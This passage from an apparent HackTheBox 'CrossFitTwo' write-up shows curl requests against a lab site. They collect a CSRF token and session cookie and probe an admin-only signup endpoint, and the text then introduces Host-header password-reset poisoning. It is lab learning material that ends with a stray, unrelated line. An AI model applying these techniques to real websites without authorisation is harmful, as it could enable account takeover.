< Access-Control-Allow-Headers: X-CSRF-TOKEN,Content-Type
< Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
< Connection: close
< Content-Length: 0
< Date: Fri, 18 Sep 2026 06:45:48 GMT
< Vary: Origin
< X-Powered-By: Express
< 
* shutting down connection #0

```

Typically, this token is associated with a cookie between requests, and `/api/auth` is setting a cookie:

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# curl -vs http://crossfit-club.htb/api/auth
* Host crossfit-club.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.87.222
*   Trying 10.129.87.222:80...
* Established connection to crossfit-club.htb (10.129.87.222 port 80) from 10.10.15.206 port 42210 
* using HTTP/1.x
> GET /api/auth HTTP/1.1
> Host: crossfit-club.htb
> User-Agent: curl/8.21.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Access-Control-Allow-Credentials: true
< Connection: keep-alive
< Content-Length: 66
< Content-Type: application/json; charset=utf-8
< Date: Fri, 18 Sep 2026 06:46:15 GMT
< ETag: W/"42-HEBlzwUhFYDxy831fG/yKUR+Jek"
< Keep-Alive: timeout=5
< Set-Cookie: connect.sid=s%3AnV3nmUlAxczS-PSHdpVJ84wzZ1-mJZUk.05soplCmR09Bqcl3lrzUHTTuc1xpT7YTUGk1VDjilX4; Path=/; Expires=Sat, 18 Sep 2027 06:46:15 GMT; HttpOnly
< Vary: Origin
< X-Powered-By: Express
< 
* Connection #0 to host crossfit-club.htb:80 left intact
{"success":"false","token":"F1vuNSBj-2PBVsAqtpkGRufPCjJHpN8cV6FM"}   
```

I’ll use `curl` and the `-c` to save cookies to a file, and then `-b` to read from that file.

```
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─# TOKEN=$(curl -c /tmp/c -s http://crossfit-club.htb/api/auth | jq -r '.token');
                                                                                                                                                                              
┌──(root㉿kali)-[~/Desktop/HTB/CrossFitTwo]
└─#  curl -s -b /tmp/c -X POST crossfit-club.htb/api/signup -H "X-CSRF-TOKEN: ${TOKEN}"
{"success":"false","message":"Only administrators can register accounts."}                                                                                                                                                                              

```

The next step was inspired by [this HackerOne report](https://hackerone.com/reports/281575). Basically, the site wanted the password reset script to be robust against website name changes, so it used the `Host` header to generate the link that gets sent to the user.

End in here that is too insene
